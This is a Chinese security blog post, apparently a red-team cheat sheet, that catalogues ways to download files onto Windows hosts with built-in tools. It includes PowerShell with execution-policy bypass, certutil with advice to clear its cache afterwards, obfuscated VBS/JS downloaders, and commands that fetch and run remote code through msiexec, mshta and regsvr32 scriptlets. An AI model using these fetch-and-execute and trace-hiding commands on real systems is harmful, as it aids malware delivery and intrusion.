@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="cn">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"cangqingzhe.github.io","root":"/","scheme":"Muse","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="1好好学习，天天向上  ​        我认为按照我们平时对于远程加载文件的需求，可以按照能否加载任意格式的文件来进行区分，有些下载方式，可以去远程下载任意格式的文件，比如exe,txt等等，但是有些则是有限制的，只能下载指定格式的文件，比如js，xls，msi等等。还有些方式也可以下载或者加载远程的文件，但是不是windows自带的方式，所以也可以把这种方式当作一种类型进行总结。最后还有一些方">
+<meta property="og:type" content="article">
+<meta property="og:title" content="windows文件下载方式总结">
+<meta property="og:url" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="藏青&#39;s BLOG">
+<meta property="og:description" content="1好好学习，天天向上  ​        我认为按照我们平时对于远程加载文件的需求，可以按照能否加载任意格式的文件来进行区分，有些下载方式，可以去远程下载任意格式的文件，比如exe,txt等等，但是有些则是有限制的，只能下载指定格式的文件，比如js，xls，msi等等。还有些方式也可以下载或者加载远程的文件，但是不是windows自带的方式，所以也可以把这种方式当作一种类型进行总结。最后还有一些方">
+<meta property="og:locale" content="cn">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200812213732096.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200812214929736.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200820104905690.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200820105120705.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200820105507751.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821100115562.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821104803291.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821105402895.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821110118839.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821110958332.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821114745482.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821134222982.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821134354798.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821135750174.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821140228440.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821140727620.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821141107404.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821141739314.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821142928346.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821145912928.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821150020632.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821150327583.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821155948134.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821160044054.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821164751755.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821165453771.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821170207437.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821172655915.png">
+<meta property="article:published_time" content="2020-08-12T09:21:36.000Z">
+<meta property="article:modified_time" content="2020-08-21T09:34:59.166Z">
+<meta property="article:author" content="藏青">
+<meta property="article:tag" content="文件传输 windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200812213732096.png">
+
+<link rel="canonical" href="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>windows文件下载方式总结 | 藏青's BLOG</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">藏青's BLOG</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="藏青">
+      <meta itemprop="description" content="知行合一">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="藏青's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          windows文件下载方式总结
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-08-12 17:21:36" itemprop="dateCreated datePublished" datetime="2020-08-12T17:21:36+08:00">2020-08-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-08-21 17:34:59" itemprop="dateModified" datetime="2020-08-21T17:34:59+08:00">2020-08-21</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">好好学习，天天向上</span><br></pre></td></tr></table></figure>
+
+<p>​        我认为按照我们平时对于远程加载文件的需求，可以按照能否加载任意格式的文件来进行区分，有些下载方式，可以去远程下载任意格式的文件，比如exe,txt等等，但是有些则是有限制的，只能下载指定格式的文件，比如js，xls，msi等等。还有些方式也可以下载或者加载远程的文件，但是不是windows自带的方式，所以也可以把这种方式当作一种类型进行总结。最后还有一些方式不能通过http协议进行下载，但是可以通过smb协议进行下载文件，这也可以列为一种方式。</p>
+<h3 id="下载任意格式文件"><a href="#下载任意格式文件" class="headerlink" title="下载任意格式文件"></a>下载任意格式文件</h3><h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><p><strong>方法一：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;xxx:6666&#x2F;1.txt&#39;,&#39;C:\Windows\Temp\2.txt&#39;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200812213732096.png" alt="image-20200812213732096"></p>
+<p><strong>方法二：</strong></p>
+<pre><code>首先准备一个ps脚本，内容如下</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$Urls &#x3D; @()</span><br><span class="line">$Urls +&#x3D; &quot;http:&#x2F;&#x2F;xxx:6666&#x2F;foo.xsl&quot;</span><br><span class="line">$OutPath &#x3D; &quot;C:\Windows\Temp\&quot; </span><br><span class="line">ForEach ( $item in $Urls) &#123;</span><br><span class="line">$file &#x3D; $OutPath + ($item).split(&#39;&#x2F;&#39;)[-1]</span><br><span class="line">(New-Object System.Net.WebClient).DownloadFile($item, $file) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        使用下面命令执行下载文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -File down.ps1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200812214929736.png" alt="image-20200812214929736"></p>
+<h4 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h4><p>​        用于备份证书服务，支持xp-win10都支持。由于certutil下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;xxx:6666&#x2F;1.txt c:\windows\temp\test.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200820104905690.png" alt="image-20200820104905690"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;ccc:6666&#x2F;1.txt delete  删除缓存</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200820105120705.png" alt="image-20200820105120705"></p>
+<h4 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h4><p>​        bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;xxxx:6666&#x2F;1.txt C:\Windows\Temp\3.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200820105507751.png" alt="image-20200820105507751"></p>
+<h4 id="vbs"><a href="#vbs" class="headerlink" title="vbs"></a>vbs</h4><p><strong>方法一：</strong></p>
+<p>​        可以使用vbs脚本来执行文件下载操作,vbs内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set a&#x3D;createobject(&quot;adod&quot;+&quot;b.stream&quot;):set w&#x3D;createobject(&quot;micro&quot;+&quot;soft.xmlhttp&quot;):w.open&quot;get&quot;,wsh.arguments(0),0:w.send:a.type&#x3D;1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2</span><br></pre></td></tr></table></figure>
+
+<p>​        再使用cscript加载该文件执行下载写入的功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript &#x2F;nologo downfile.vbs http:&#x2F;&#x2F;xxx:801&#x2F;1.txt c:\windows\temp\1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821100115562.png" alt="image-20200821100115562"></p>
+<p>​        甚至也可以使用cmd先写入vbs文件，最后再调用vbs执行下载功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo set a&#x3D;createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set w&#x3D;createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open^&quot;get^&quot;,wsh.arguments(0),0:w.send:a.type&#x3D;1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt;downfile.vbs</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法二：</strong></p>
+<p>​        还可以使用其他的下载vbs脚本文件执行下载功能，文件内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">strFileURL &#x3D; &quot;http:&#x2F;&#x2F;119.xxx.xxx.xxx&#x2F;1.txt&quot;</span><br><span class="line">strHDLocation &#x3D; &quot;1.txt&quot;</span><br><span class="line">Set objXMLHTTP &#x3D; CreateObject(&quot;MSXML2.XMLHTTP&quot;)</span><br><span class="line">objXMLHTTP.open &quot;GET&quot;, strFileURL, false</span><br><span class="line">objXMLHTTP.send()</span><br><span class="line">If objXMLHTTP.Status &#x3D; 200 Then</span><br><span class="line">Set objADOStream &#x3D; CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">objADOStream.Open</span><br><span class="line">objADOStream.Type &#x3D; 1</span><br><span class="line">objADOStream.Write objXMLHTTP.ResponseBody</span><br><span class="line">objADOStream.Position &#x3D; 0</span><br><span class="line">Set objFSO &#x3D; CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation</span><br><span class="line">Set objFSO &#x3D; Nothing</span><br><span class="line">objADOStream.SaveToFile strHDLocation</span><br><span class="line">objADOStream.Close</span><br><span class="line">Set objADOStream &#x3D; Nothing</span><br><span class="line">End if</span><br><span class="line">Set objXMLHTTP &#x3D; Nothing</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821104803291.png" alt="image-20200821104803291"></p>
+<h4 id="js"><a href="#js" class="headerlink" title="js"></a>js</h4><p><strong>方法一：</strong></p>
+<p>​        首先准备一个js文件，文件内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">var objArgs &#x3D; WScript.Arguments;var sGet&#x3D;new ActiveXObject(&quot;ADODB.Stream&quot;);var xGet &#x3D; false;</span><br><span class="line">try &#123;</span><br><span class="line">xGet &#x3D; new XMLHttpRequest();</span><br><span class="line">&#125; </span><br><span class="line">catch (trymicrosoft) &#123;</span><br><span class="line">try &#123;</span><br><span class="line">    xGet &#x3D; new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);</span><br><span class="line">&#125; </span><br><span class="line">catch (othermicrosoft) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">      xGet &#x3D; new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">    &#125; </span><br><span class="line">catch (failed) &#123;</span><br><span class="line">      xGet &#x3D; false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">xGet.Open (&quot;GET&quot;,objArgs(0).toLowerCase(),0);xGet.Send();sGet.Mode&#x3D;3;sGet.Type&#x3D;1;sGet.Open();sGet.Write (xGet.ResponseBody);sGet.SaveToFile (objArgs(1).toLowerCase(),2);</span><br></pre></td></tr></table></figure>
+
+<p>​        通过cscript调用该文件执行下载操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript &#x2F;nologo down.js http:&#x2F;&#x2F;xxx:801&#x2F;1.txt c:\windows\temp\test123123.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821105402895.png" alt="image-20200821105402895"></p>
+<p><strong>方法二：</strong></p>
+<p>​        准备一个js文件，文件内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var WinHttpReq &#x3D; new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span><br><span class="line">WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), &#x2F;*async&#x3D;*&#x2F;false);</span><br><span class="line">WinHttpReq.Send();</span><br><span class="line">BinStream &#x3D; new ActiveXObject(&quot;ADODB.Stream&quot;); BinStream.Type &#x3D; 1;</span><br><span class="line">BinStream.Open(); BinStream.Write(WinHttpReq.ResponseBody);</span><br><span class="line">BinStream.SaveToFile(&quot;test12312223123.txt&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>​        执行如下命令进行下载文件操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript &#x2F;nologo down2.js http:&#x2F;&#x2F;xxx:801&#x2F;1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821110118839.png" alt="image-20200821110118839"></p>
+<p><strong>注意</strong></p>
+<p>​        方法二这种文件下载方式有一些缺点，首先不能指定绝对路径，否则会写入失败，另外，文件名也不能和系统在该目录下已有的文件名冲突，否则也会写入失败。</p>
+<h4 id="certreq"><a href="#certreq" class="headerlink" title="certreq"></a>certreq</h4><p>​        在 Windows Server 2008 R2 上提供了 Microsoft certreq 实用程序，可使用该实用程序生成 CSR 和导入签名证书。下载命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CertReq -Post -config http:&#x2F;&#x2F;xxx:801&#x2F;1.txt c:\windows\win.ini c:\windows\temp\output.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821110958332.png" alt="image-20200821110958332"></p>
+<p>​        这个程序虽然可以下载任意形式的文件，但是又有两个限制，第一个限制就是在serever 2008 r2以上的系统。第二个就是长度限制，不能下载超过60k的文件。这种文件下载的方式如果文件存在也会报错，因此使用这种方式下载文件，文件名不能和已有的文件名相同。</p>
+<h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;from urllib import urlretrieve; urlretrieve(&#39;http:&#x2F;&#x2F;xxx:801&#x2F;1.txt&#39;, &#39;C:\\Windows\\Temp\\test8866.txt&#39;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821114745482.png" alt="image-20200821114745482"></p>
+<h4 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h4><h3 id="下载指定格式文件"><a href="#下载指定格式文件" class="headerlink" title="下载指定格式文件"></a>下载指定格式文件</h3><h4 id="msiexec"><a href="#msiexec" class="headerlink" title="msiexec"></a>msiexec</h4><p>​        使用msiexec可以下载并执行msi文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec &#x2F;q &#x2F;i http:&#x2F;&#x2F;xxxx:8011&#x2F;test666.msi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821134222982.png" alt="image-20200821134222982"></p>
+<h4 id="mshta"><a href="#mshta" class="headerlink" title="mshta"></a>mshta</h4><p>​        mshta可以远程加载hta文件并执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:801&#x2F;download&#x2F;file.ext</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/12/windows%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/image-20200821134354798.png" alt="image-20200821134354798"></p>
+<h4 id="regsvr32"><a href="#regsvr32" class="headerlink" title="regsvr32"></a>regsvr32</h4><p>​        使用regsvr32可以远程加载并执行sct文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 &#x2F;u &#x2F;s &#x2F;i:http:&#x2F;&#x2F;xxx:8011&#x2F;test8866.sct scrobj.dll</span><br></pre></td></tr></table></figure>
+
